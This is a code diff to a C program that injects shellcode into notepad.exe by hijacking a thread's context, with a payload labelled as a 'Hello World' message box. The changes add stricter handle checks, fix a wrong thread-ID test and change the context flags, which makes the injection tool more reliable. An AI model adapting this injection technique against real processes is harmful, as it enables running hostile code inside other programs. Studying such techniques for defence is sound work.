@@ -5,6 +5,7 @@
 #include <string.h>
 
 #define TARGET "notepad.exe"
+#define IS_HANDLE_INVALID(x) (x==NULL || x==INVALID_HANDLE_VALUE)
 
 // "Hello World" MessageBox shellcode
 unsigned char payload[] = 
@@ -53,7 +54,7 @@ DWORD find_pid(const char* procname) {
     );
 
     // Check if handle is valid
-    if (INVALID_HANDLE_VALUE == hProcSnap) {
+    if (IS_HANDLE_INVALID(hProcSnap)) {
         fprintf(stderr, "[!] CreateToolhelp32Snapshot() failed (0x%x)\n", GetLastError());
         return 0;
     }
@@ -88,6 +89,11 @@ DWORD find_threadid(DWORD pid) {
     THREADENTRY32 thEntry;
     thEntry.dwSize = sizeof(THREADENTRY32);
     HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+    if (IS_HANDLE_INVALID(hThreadSnap)) {
+        fprintf(stderr, "[!] CreateToolhelp32Snapshot() failed (0x%x)\n", GetLastError());
+        return 0;
+    }
+    
     BOOL result = Thread32First(hThreadSnap, &thEntry);
     if (!result) {
         fprintf(stderr, "[!] Thread32First() failed (0x%x)\n", GetLastError());
@@ -98,7 +104,7 @@ DWORD find_threadid(DWORD pid) {
     while (Thread32Next(hThreadSnap, &thEntry)) {
         if (thEntry.th32OwnerProcessID == pid) {
             HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, thEntry.th32ThreadID); 
-            if (hThread != INVALID_HANDLE_VALUE) {
+            if (!(IS_HANDLE_INVALID(hThread))) {
                 CloseHandle(hThread);
                 CloseHandle(hThreadSnap);
                 return thEntry.th32ThreadID;
@@ -117,14 +123,14 @@ int inject_thread_context(DWORD pid) {
     DWORD bWritten = 0;
 
     DWORD thId = find_threadid(pid);
-    if (pid == 0) {
+    if (thId == 0) {
         fprintf(stderr, "[!] Could not find any valid ThreadID's\n");
         return -1;
     }
 
     // Open Handle to Thread
     HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, thId);
-    if (hThread == INVALID_HANDLE_VALUE) {
+    if (IS_HANDLE_INVALID(hThread)) {
         fprintf(stderr, "[!] OpenThread() failed (0x%x)\n", GetLastError());
         return -1;
     }
@@ -135,7 +141,7 @@ int inject_thread_context(DWORD pid) {
     HANDLE hProcess = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
                         PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
                         FALSE, (DWORD) pid);
-    if (hProcess == INVALID_HANDLE_VALUE) {
+    if (IS_HANDLE_INVALID(hProcess)) {
         fprintf(stderr, "[!] OpenProcess() failed (0x%x)\n", GetLastError());
         CloseHandle(hThread);
         return -1;
@@ -174,7 +180,7 @@ int inject_thread_context(DWORD pid) {
         return -1;
     }
 
-    ctx.ContextFlags = CONTEXT_FULL;   // retrieve all the necessary information about the thread's execution state
+    ctx.ContextFlags = CONTEXT_CONTROL;   // retrieve all the necessary information about the thread's execution state
 
     // Retrieves the context of the specified thread.
     bResult = GetThreadContext(hThread, &ctx);
